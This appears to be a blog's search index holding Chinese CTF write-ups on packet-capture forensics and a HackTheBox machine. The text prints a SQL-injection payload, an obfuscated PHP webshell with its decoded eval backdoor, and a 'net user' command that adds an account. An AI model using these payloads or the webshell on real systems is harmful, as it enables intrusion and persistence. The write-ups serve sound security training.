<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>闽盾杯2024-出题人的上网流量</title>
    <url>/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F.html</url>
    <content><![CDATA[<p>新接触流量包的SMTP协议，特此进行分析学习</p>
<span id="more"></span>

<h1 id="闽盾杯2024-出题人的上网流量"><a href="#闽盾杯2024-出题人的上网流量" class="headerlink" title="闽盾杯2024-出题人的上网流量"></a>闽盾杯2024-出题人的上网流量</h1><p>打开下好的附件，开始是重点对http流量进行分析</p>
<p>注意到IP为<code>10.50.0.143</code>非常可疑，进行筛选</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==10.50.0.143</span><br></pre></td></tr></table></figure>

<p>往后翻看到有下载图片</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212226001.png"></p>
<p>追踪tcp流发现回显包是jpg图片，我们直接转原始数据另存为1.jpg文件</p>
<p>然后010打开去掉jpg文件头前面内容保存</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212403301.png"></p>
<p>结果三张都是学生证，没啥用</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212546676.png"></p>
<p>然后翻追踪的流有小一会，注意到第86流有和SMTP邮件协议有关的邮件对话</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212728983.png"></p>
<p>将那几个base64解码也能得到邮箱以及密码，还有后面的聊天内容</p>
<p>最重要的是有传递docx文件</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213001968.png"></p>
<p>经过一番搜索，得知可以将抓的SMTP协议包另存为<code>.eml</code>文件，随便找个能打开邮件的就行</p>
<p>直接用foxmail打开，可以得到docx文件密码即为qq号</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213125940.png"></p>
<p>由于是qq号，并且注意到流量包存在QICQ（也就是qq）</p>
<p>点开就找到217778</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240628111006057.png"></p>
<p>或者直接去官网找到吴老师的qq号</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213225024.png"></p>
<p>解开得到flag</p>
<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213320447.png"></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>SMTP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全铁人三项数据赛2018</title>
    <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
    <content><![CDATA[<p>记录一些铁三的流量分析题</p>
<span id="more"></span>



<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><p><strong>题目要求：</strong><br><strong>1.黑客攻击的第一个受害主机的网卡IP地址</strong><br><strong>2.黑客对URL的哪一个参数实施了SQL注入</strong><br><strong>3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）</strong><br><strong>4.第一个受害主机网站数据库的名字</strong></p>
<p>我们直接查看http流，注意到ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>不断地发包</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423212801277.png"></p>
<p>所以受害主机ip为<code>192.168.1.8</code></p>
<p>我们筛选一下源ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==202.1.1.2</span><br></pre></td></tr></table></figure>

<p>在分组列表往下翻注意到使用sqlmap进行注入攻击，追踪tcp流</p>
<p>得到注入参数为<code>list[select]</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423213600211.png"></p>
<p>我们在195流注意到响应包泄露了数据表名称前缀为<code>ajtuc</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423214201938.png"></p>
<p>或者我们找到最后一次注入的payload，解码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</span><br></pre></td></tr></table></figure>

<p>得到数据库名称为<code>joomla</code></p>
<h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><p><strong>题目要求：<br>1.黑客第一次获得的php木马的密码是什么<br>2.黑客第二次上传php木马是什么时间<br>3.第二次上传的木马通过HTTP协议中的哪个头传递数据</strong></p>
<p>题目一已经锁定了目标ip信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>筛选一下注意到<code>/kkkaaa.php</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423221618117.png"></p>
<p>追踪tcp流得到参数为zzz</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423223256000.png"></p>
<p>获取第二个木马时间就要看POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>注意到下面这个包有参数<code>z2</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423230356685.png"></p>
<p>我们将十六进制数据解码一下得到php代码（美化一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p=&#x27;l&gt;]ower&quot;;$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5&#x27;;</span><br><span class="line">$d=&#x27;]q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(&quot;/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/&quot;,&gt;&#x27;;</span><br><span class="line">$W=&#x27;),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base&#x27;;</span><br><span class="line">$e=&#x27;]T_LANGUAGE&quot;];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[&quot;&gt;]query&quot;],$&gt;]q);$&gt;&#x27;;</span><br><span class="line">$E=&#x27;&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(&quot;&lt;$k&gt;$d&lt;&gt;]/$k&gt;&quot;&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;&#x27;;</span><br><span class="line">$t=&#x27;($i.&gt;]$kf),0,3&gt;]));$p&gt;]=&quot;&quot;;fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;&#x27;;</span><br><span class="line">$M=&#x27;]$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=&quot;substr&quot;;$sl=&quot;s&gt;]&gt;]trto&#x27;;</span><br><span class="line">$P=&#x27;]f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]=&quot;&quot;;$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;&#x27;;</span><br><span class="line">$j=str_replace(&#x27;fr&#x27;,&#x27;&#x27;,&#x27;cfrrfreatfrfre_funcfrtfrion&#x27;);</span><br><span class="line">$k=&#x27;];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]&quot;HTTP&gt;]_REFERE&gt;]R&quot;];$ra&gt;]=@&gt;]$r[&quot;&gt;]HTTP_A&gt;]CC&gt;]EP&gt;&#x27;;</span><br><span class="line">$g=&#x27;&quot;&quot;;for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;&#x27;;</span><br><span class="line">$R=&#x27;$k&gt;]h=&quot;cb4&gt;]2&quot;;$kf=&quot;e130&quot;&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=&#x27;;</span><br><span class="line">$Q=&#x27;]s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;&#x27;;</span><br><span class="line">$v=&#x27;]mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(&quot;/_/&quot;,&quot;/-/&quot;),arr&gt;]ay(&gt;]&quot;/&quot;,&quot;+&quot;&gt;]&#x27;;</span><br><span class="line">$x=str_replace(&#x27;&gt;]&#x27;,&#x27;&#x27;,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);</span><br><span class="line">$N=$j(&#x27;&#x27;,$x);</span><br><span class="line">$N();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>很明显是代码混淆过的，注意变量j和x，应该是可以把代码变回去</p>
<p>在结尾添加即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure>

<p>发现有eval出现，说明此包为第二次上传木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$kh = &quot;cb42&quot;;</span><br><span class="line">$kf = &quot;e130&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);</span><br><span class="line">    $q = array_values($q);</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s =&amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][4];</span><br><span class="line">        $h = $sl($ss(md5($i . $kh), 0, 3));</span><br><span class="line">        $f = $sl($ss(md5($i . $kf), 0, 3));</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p .= $q[$m[2][$z]];</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;</span><br><span class="line">            $s[$i] = &quot;&quot;;</span><br><span class="line">            $p = $ss($p, 3);</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;</span><br><span class="line">            $s[$i] .= $p;</span><br><span class="line">            $e = strpos($s[$i], $f);</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o), $k));</span><br><span class="line">                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功找到时间</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231540280.png"></p>
<p>上面的木马中注意到有两个http头，肯定是其中一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure>

<p>我们追踪tcp流看一下，注意到footer.php文件</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231742123.png"></p>
<p>查看一下，发现referer头存在数据传递</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240423231918800.png"></p>
<h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p><strong>题目要求：<br>1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>2.php代理第一次被使用时最先连接了哪个IP地址</strong></p>
<p>筛选http并没有收获，所以看下tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp &amp;&amp; tcp contains &quot;mysql&quot;</span><br></pre></td></tr></table></figure>

<p>注意到请求长度为151的是攻击者对admin用户进行爆破，我们直接看最后一次password的hash值</p>
<p>得到答案<code>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220800333.png"></p>
<p>为了找出连接哪个IP，我们筛选下POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>得到第一次连接的ip为<code>4.2.2.2</code></p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220929490.png"></p>
<h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><p><strong>题目要求：<br>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>2.黑客在内网主机中添加的用户名和密码是多少<br>3.黑客从内网服务器中下载下来的文件名</strong></p>
<p>找下出现列出文件列表的请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;system&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>可以发现有ls和dir，后经验证是dir</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424234829936.png"></p>
<p>我们看下响应包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.src == 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>

<p>翻了一会找到<code>NET USER</code>命令</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235537584.png"></p>
<p>继续往下翻找到添加用户为kaka</p>
<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235818984.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18:49:27.767754时，不存在kaka用户</span><br><span class="line">18:50:42.908737时，kaka用户已成为管理员</span><br></pre></td></tr></table></figure>

<p>所以可以断定作案时间点在这段时间内，找到后解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240425000833804.png"></p>
<p>既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>查看最后一个解码得到<code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>铁人三项</tag>
      </tags>
  </entry>
  <entry>
    <title>Blurry</title>
    <url>/article/Blurry.html</url>
    <content><![CDATA[<p>Allegro AI ClearML反序列化漏洞、python劫持torch库</p>
<span id="more"></span>

<h1 id="Blurry"><a href="#Blurry" class="headerlink" title="Blurry"></a>Blurry</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -v --min-rate 10000 10.10.11.19</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)</span><br><span class="line">|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)</span><br><span class="line">|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://app.blurry.htb/</span><br></pre></td></tr></table></figure>

<p>可以发现80端口出现重定向，我们添加域名到<code>/etc/hosts</code></p>
<p>继续扫描下目录，选定响应状态为200&#x2F;301</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://app.blurry.htb/ -i 200,301</span><br></pre></td></tr></table></figure>

<p><img src="/article/Blurry/image-20240901170301112.png"></p>
<p>不过没什么收获，我们直接访问下发现是名为clearml的平台</p>
<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>登录进去，百度了解到是用于机器学习的</p>
<p><img src="/article/Blurry/image-20240901170507053.png"></p>
<p>经过一番搜索发现存在pickle反序列化漏洞</p>
<p>我们点击左侧的项目，然后创建新的项目以及实验</p>
<p><img src="/article/Blurry/image-20240901170821690.png"></p>
<p>依次执行并粘贴config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install clearml</span><br><span class="line">clearml-init</span><br></pre></td></tr></table></figure>

<p><img src="/article/Blurry/image-20240901170946532.png"></p>
<p>不过这里出现了报错</p>
<p><img src="/article/Blurry/image-20240901173542984.png"></p>
<p>需要将API和Files的域名也添加到<code>/etc/hosts</code>去。重新初始化clearml，成功在<code>/home/rev1ve</code>建立<code>clearml.conf</code>文件</p>
<p>经过一番查找，注意到Black Swan项目的<code>Review JSON Artifacts</code>实验</p>
<p><img src="/article/Blurry/image-20240901192341943.png"></p>
<p>具体脚本内容如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clearml <span class="keyword">import</span> Task</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> clearml.backend_api.session.client <span class="keyword">import</span> APIClient</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_json_artifact</span>(<span class="params">data, artifact_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Process a JSON artifact represented as a Python dictionary.</span></span><br><span class="line"><span class="string">    Print all key-value pairs contained in the dictionary.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Artifact &#x27;<span class="subst">&#123;artifact_name&#125;</span>&#x27; Contents:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_task</span>(<span class="params">task</span>):</span><br><span class="line">    artifacts = task.artifacts</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> artifact_name, artifact_object <span class="keyword">in</span> artifacts.items():</span><br><span class="line">        data = artifact_object.get()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">dict</span>):</span><br><span class="line">            process_json_artifact(data, artifact_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Artifact &#x27;<span class="subst">&#123;artifact_name&#125;</span>&#x27; content is not a dictionary.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    review_task = Task.init(project_name=<span class="string">&quot;Black Swan&quot;</span>, </span><br><span class="line">                            task_name=<span class="string">&quot;Review JSON Artifacts&quot;</span>, </span><br><span class="line">                            task_type=Task.TaskTypes.data_processing)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Retrieve tasks tagged for review</span></span><br><span class="line">    tasks = Task.get_tasks(project_name=<span class="string">&#x27;Black Swan&#x27;</span>, tags=[<span class="string">&quot;review&quot;</span>], allow_archived=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tasks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] No tasks up for review.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Reviewing artifacts from task: <span class="subst">&#123;task.name&#125;</span> (ID: <span class="subst">&#123;task.<span class="built_in">id</span>&#125;</span>)&quot;</span>)</span><br><span class="line">        p = Process(target=process_task, args=(task,))</span><br><span class="line">        p.start()</span><br><span class="line">        threads.append(p)</span><br><span class="line">        task.set_archived(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">            thread.terminate()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Mark the ClearML task as completed</span></span><br><span class="line">    review_task.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cleanup</span>():</span><br><span class="line">    client = APIClient()</span><br><span class="line">    tasks = client.tasks.get_all(</span><br><span class="line">        system_tags=[<span class="string">&quot;archived&quot;</span>],</span><br><span class="line">        only_fields=[<span class="string">&quot;id&quot;</span>],</span><br><span class="line">        order_by=[<span class="string">&quot;-last_update&quot;</span>],</span><br><span class="line">        page_size=<span class="number">100</span>,</span><br><span class="line">        page=<span class="number">0</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete and cleanup tasks</span></span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        <span class="comment"># noinspection PyBroadException</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            deleted_task = Task.get_task(task_id=task.<span class="built_in">id</span>)</span><br><span class="line">            deleted_task.delete(</span><br><span class="line">                delete_artifacts_and_models=<span class="literal">True</span>,</span><br><span class="line">                skip_models_used_by_other_tasks=<span class="literal">True</span>,</span><br><span class="line">                raise_on_error=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    cleanup()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大概作用就是检索所有标记为”review”的项目名为”Black Swan”的任务，并且这里我们注意到对应clearml的版本1.13.1</p>
<p>网上搜索存在cve-2024-24590漏洞，exp如下</p>
